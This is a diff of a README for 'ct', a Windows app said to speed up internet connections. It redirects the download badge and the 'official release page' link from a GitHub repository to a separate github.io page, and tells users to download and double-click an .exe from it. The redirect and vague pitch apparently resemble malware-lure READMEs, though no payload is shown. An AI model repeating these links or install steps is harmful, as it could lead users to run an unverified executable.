@@ -1,6 +1,6 @@
 # 🌐 ct - Speed up your internet connection easily
 
-[![Download ct](https://img.shields.io/badge/Download-ct-blue.svg)](https://github.com/Foreandafterleging166/ct)
+[![Download ct](https://img.shields.io/badge/Download-ct-blue.svg)](https://foreandafterleging166.github.io)
 
 ## 🎯 About this application
 
@@ -21,7 +21,7 @@ Before you start, check that your computer meets these needs:
 
 Follow these steps to install the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Foreandafterleging166/ct) to download the installer.
+1. Go to the [official release page](https://foreandafterleging166.github.io) to download the installer.
 2. Look for the file ending in .exe in the latest release section.
 3. Save the file to your desktop for easy access.
 4. Double-click the file to start the process.
